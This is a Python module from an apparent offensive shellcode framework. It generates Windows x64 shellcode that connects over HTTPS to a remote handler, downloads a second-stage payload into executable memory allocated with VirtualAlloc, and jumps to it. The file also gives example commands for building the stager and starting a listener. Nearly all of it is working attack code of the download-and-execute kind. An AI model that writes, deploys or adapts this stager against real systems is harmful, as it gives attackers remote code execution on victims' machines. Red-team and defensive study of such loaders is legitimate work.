import sys
import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.programmer import builder
from sickle.common.lib.programmer import stubhub

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    winnt,
)

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) VirtualAlloc Shellcode Loader (HTTPS)"

    module = f"{platform}/{arch}/virtualalloc_exec_https"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.50.210 LPORT=443 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]

    summary = ("A lightweight stager that connects to a handler over HTTPS to receive and execute shellcode")

    description = ("This shellcode stub connects to a remote server handler over HTTPS, downloads a second-stage"
                   " payload, and executes it. You can generate this initial stager using the following syntax."
                   "\n\n"

                   f"    {sys.argv[0]} -p {module} LHOST=192.168.50.210 LPORT=443 -f c"

                   "\n\n"

                   "Sickle can be used to start a handler as shown below:\n\n"

                   f"    {sys.argv[0]} -m handler -p windows/x64/reflective_pe_loader EXE=/tmp/payload.exe "
                   "HANDLER=https SRVHOST=192.168.50.210 SRVPORT=443\n\n"

                   "Upon execution of the first stage, you should get a connection from the target on your handler"
                   " and the second stage should begin executing on the target machine")

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    advanced = {}
    advanced["USER_AGENT"] = {}
    advanced["USER_AGENT"]["optional"] = "yes"
    advanced["USER_AGENT"]["description"] = "User agent to use for HTTPS communication"

    advanced["REQUEST"] = {}
    advanced["REQUEST"]["optional"] = "yes"
    advanced["REQUEST"]["description"] = "The HTTP request to use when fetching the second stage"
    advanced["REQUEST"]["options"] = { "GET": "Standard GET request" }

    advanced["PATH"] = {}
    advanced["PATH"]["optional"] = "yes"
    advanced["PATH"]["description"] = "The HTTP path where the payload is hosted on the target server"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.dependencies = {
            "Kernel32.dll": [
                "LoadLibraryA",
                "VirtualAlloc",
            ],
            "wininet.dll" : [
                "InternetOpenA",
                "InternetConnectA",
                "HttpOpenRequestA",
                "InternetSetOptionA",
                "HttpSendRequestA",
                "InternetReadFile",
            ],
        }

        self.set_args()

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({
            "caUserAgent"           : self.user_agent_size,
            "caHost"                : len(self.lhost),
            "caPath"                : len(self.path),
            "caRequest"             : 0x00,
            "lpdwNumberOfBytesRead" : 0x00,
            "lpvShellcode"          : 0x00,
            "hInternet"             : 0x00,
            "hConnect"              : 0x00,
            "hRequest"              : 0x00,
            "dwFlags"               : 0x00,
            "dwSize"                : 0x00,
        })

        self.stack_space = builder.calc_stack_space(sc_args)
        self.storage_offsets = builder.gen_offsets(sc_args)

        return

    def set_args(self):
        """Configure the arguments that may be used by the shellcode stub
        """
   
        all_args = Shellcode.arguments
        all_args.update(Shellcode.advanced)
        argv_dict = modparser.argument_check(all_args, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        # Configure the options used by the host to obtain the callback
        if "LPORT" not in argv_dict.keys():
            self.lport = 4242
        else:
            self.lport = int(argv_dict["LPORT"])

        self.lhost = argv_dict['LHOST']

        # Set the User-Agent
        if "USER_AGENT" not in argv_dict.keys():
            self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.3485.66" 
        else:
            self.user_agent = argv_dict["USER_AGENT"]

        self.user_agent_size = len(self.user_agent)

        # Set the request type
        req_type = "GET"
        if "REQUEST" not in argv_dict.keys():
            req_type = b"GET"
        else:
            req_type = bytes(argv_dict["REQUEST"], 'latin-1')

        # Ensure that the request can be packed
        req_type += b"\x00" * (8 - len(req_type))
        self.request = hex( struct.unpack('>Q', req_type[::-1])[0] )


        # Set the SSL flags
        self.dwSSLFlags = (0x00800000 | 0x00001000)
        self.dwFlags = (0x00000100 | 0x10000000 | 0x00000200)

        # Set the HTTP path
        if "PATH" not in argv_dict.keys():
            self.path = "/corn"
        else:
            self.path = argv_dict["PATH"]

    def gen_main(self):
        """Returns assembly source code for the main functionality of the stub
        """

        user_agent_buffer = convert.from_str_to_xwords(self.user_agent)
        write_index = self.storage_offsets['caUserAgent']

        src = ""
        for i in range(len(user_agent_buffer["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', user_agent_buffer["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(user_agent_buffer["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', user_agent_buffer["DWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(user_agent_buffer["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', user_agent_buffer["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(user_agent_buffer["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(user_agent_buffer["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor rcx, rcx
    mov [rbp - {write_index}], cl
    lea rcx, [rbp - {self.storage_offsets['caUserAgent']}]\n"""

        src += f"""
; HINTERNET InternetOpenA([in] LPCSTR lpszAgent,
;                         [in] DWORD  dwAccessType,
;                         [in] LPCSTR lpszProxy,
;                         [in] LPCSTR lpszProxyBypass,
;                         [in] DWORD  dwFlags); 
    xor rdx, rdx
    xor r8, r8
    xor r9, r9
    mov [rsp + 0x20], r9
    mov rax, [rbp - {self.storage_offsets['InternetOpenA']}]
    call rax
    mov [rbp - {self.storage_offsets['hInternet']}], rax\n"""

        lhost_buffer = convert.from_str_to_xwords(self.lhost)
        write_index = self.storage_offsets['caHost']

        for i in range(len(lhost_buffer["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lhost_buffer["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(lhost_buffer["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', lhost_buffer["DWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(lhost_buffer["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lhost_buffer["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(lhost_buffer["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(lhost_buffer["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor rcx, rcx
    mov [rbp - {write_index}], cl
    lea rdx, [rbp - {self.storage_offsets['caHost']}]\n"""

        src += f"""
; HINTERNET InternetConnectA([in] HINTERNET     hInternet,
;                            [in] LPCSTR        lpszServerName,
;                            [in] INTERNET_PORT nServerPort,
;                            [in] LPCSTR        lpszUserName,
;                            [in] LPCSTR        lpszPassword,
;                            [in] DWORD         dwService,
;                            [in] DWORD         dwFlags,
;                            [in] DWORD_PTR     dwContext);
    mov rcx, [rbp - {self.storage_offsets['hInternet']}]
    mov r8, {hex(self.lport)}
    xor r9, r9
    mov [rsp + 0x20], r9
    mov r11, 0x03
    mov [rsp + 0x28], r11
    mov [rsp + 0x30], r9
    mov [rsp + 0x38], r9
    mov rax, [rbp - {self.storage_offsets['InternetConnectA']}]
    call rax
    mov [rbp - {self.storage_offsets['hConnect']}], rax\n"""

        path_buffer = convert.from_str_to_xwords(self.path)
        write_index = self.storage_offsets['caPath']

        for i in range(len(path_buffer["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', path_buffer["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(path_buffer["DWORD_LIST"])):
            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', path_buffer["DWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(path_buffer["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', path_buffer["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(path_buffer["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(path_buffer["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor rcx, rcx
    mov [rbp - {write_index}], cl
    lea r8, [rbp - {self.storage_offsets['caPath']}]\n"""

        src += f"""
; HINTERNET HttpOpenRequestA([in] HINTERNET hConnect,
;                            [in] LPCSTR    lpszVerb,
;                            [in] LPCSTR    lpszObjectName,
;                            [in] LPCSTR    lpszVersion,
;                            [in] LPCSTR    lpszReferrer,
;                            [in] LPCSTR    *lplpszAcceptTypes,
;                            [in] DWORD     dwFlags,
;                            [in] DWORD_PTR dwContext);
    mov rcx, [rbp - {self.storage_offsets['hConnect']}]
    mov r11, {self.request}
    mov [rbp - {self.storage_offsets['caRequest']}], r11
    lea rdx, [rbp - {self.storage_offsets['caRequest']}]
    xor r9, r9
    mov [rsp + 0x20], r9
    mov [rsp + 0x28], r9
    mov r11, {hex(self.dwSSLFlags)}
    mov [rsp + 0x30], r11
    mov [rsp + 0x38], r9
    mov rax, [rbp - {self.storage_offsets['HttpOpenRequestA']}]
    call rax
    mov [rbp - {self.storage_offsets['hRequest']}], rax

; BOOL InternetSetOptionA([in] HINTERNET hInternet,
;                         [in] DWORD     dwOption,
;                         [in] LPVOID    lpBuffer,
;                         [in] DWORD     dwBufferLength);
    mov rcx, [rbp - {self.storage_offsets['hRequest']}]
    mov rdx, 0x1F
    mov r11, {hex(self.dwFlags)}
    mov [rbp - {self.storage_offsets['dwFlags']}], r11
    lea r8, [rbp - {self.storage_offsets['dwFlags']}]
    mov r9, 0x04
    mov rax, [rbp - {self.storage_offsets['InternetSetOptionA']}]
    call rax

; BOOL HttpSendRequestA([in] HINTERNET hRequest,
;                       [in] LPCSTR    lpszHeaders,
;                       [in] DWORD     dwHeadersLength,
;                       [in] LPVOID    lpOptional,
;                       [in] DWORD     dwOptionalLength);
    mov rcx, [rbp - {self.storage_offsets['hRequest']}]
    xor rdx, rdx
    xor r8, r8
    xor r9, r9
    mov [rsp + 0x20], r9
    mov rax, [rbp - {self.storage_offsets['HttpSendRequestA']}]
    call rax

; BOOL InternetReadFile([in]  HINTERNET hFile,
;                       [out] LPVOID    lpBuffer,
;                       [in]  DWORD     dwNumberOfBytesToRead,
;                       [out] LPDWORD   lpdwNumberOfBytesRead);
    lea rdx, [rbp - {self.storage_offsets['dwSize']}]
    mov r8, 0x08
call_InternetReadFile:
    mov rcx, [rbp - {self.storage_offsets['hRequest']}]
    lea r9, [rbp - {self.storage_offsets['lpdwNumberOfBytesRead']}]
    mov rax, [rbp - {self.storage_offsets['InternetReadFile']}]
    call rax

    mov eax, [rbp - {self.storage_offsets['lpdwNumberOfBytesRead']}]
    cmp rax, 0x08
    jg download_complete

; LPVOID VirtualAlloc([in, optional] LPVOID lpAddress,
;                     [in]           SIZE_T dwSize,
;                     [in]           DWORD  flAllocationType,
;                     [in]           DWORD  flProtect);
call_VirtualAlloc:
    mov rcx, [rbp - {self.storage_offsets['lpvShellcode']}]
    mov rdx, [rbp - {self.storage_offsets['dwSize']}]
    mov r8, {winnt.MEM_COMMIT | winnt.MEM_RESERVE}
    mov r9, {winnt.PAGE_EXECUTE_READWRITE}
    mov rax, [rbp - {self.storage_offsets['VirtualAlloc']}]
    call rax

    mov [rbp - {self.storage_offsets['lpvShellcode']}], rax
    mov rdx, rax
    mov r8, [rbp - {self.storage_offsets['dwSize']}]

    jmp call_InternetReadFile

download_complete:
    jmp [rbp - {self.storage_offsets['lpvShellcode']}]\n"""


        return src

    def get_shellcode(self):
        """Generates shellcode
        """

        generator = Assembler(Shellcode.arch)
        win_stubs = stubhub.WinRawr(self.storage_offsets,
                                    self.dependencies,
                                    self.stack_space,
                                    None)

        main_src = self.gen_main()
        src = win_stubs.gen_source(main_src)
        shellcode = generator.get_bytes_from_asm(src)

        return shellcode
